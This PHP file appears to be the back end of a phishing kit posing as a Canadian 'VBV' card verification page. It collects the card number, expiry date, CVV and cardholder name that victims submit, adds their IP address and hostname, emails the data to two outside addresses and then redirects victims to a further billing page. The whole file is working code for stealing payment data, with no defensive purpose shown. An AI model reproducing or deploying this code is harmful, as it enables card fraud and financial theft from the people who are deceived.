<?php
// Ehh l7alwa l7alwa I dédicace l3chran LAHCEN KHALID ACHRAF BADR
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message ."====+++ CANADA VBV RESULTAT +++====\n";
$message .= "Card number: ".$_POST['ccnum']."\n";
$message .= "EXP DATE (MM/YYYY): ".$_POST['month']." / ".$_POST['year']."\n";
$message .= "CVV: ".$_POST['cvv']."\n";
$message .= "CARD HOLDER: ".$_POST['ccname']."\n";
$message .= "======+ END +=======\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "=====+ -------- +=====\n";
$send = "sch.vida.2017@gmail.com,darksp@yahoo.com";
$subject = "CVV By HAMZA [".$_POST['ccnum']."]  $ip";
$headers = "From:  <resultat@okby.com>";

mail($send,$subject,$message,$headers);
header("Location: bill.php");

?>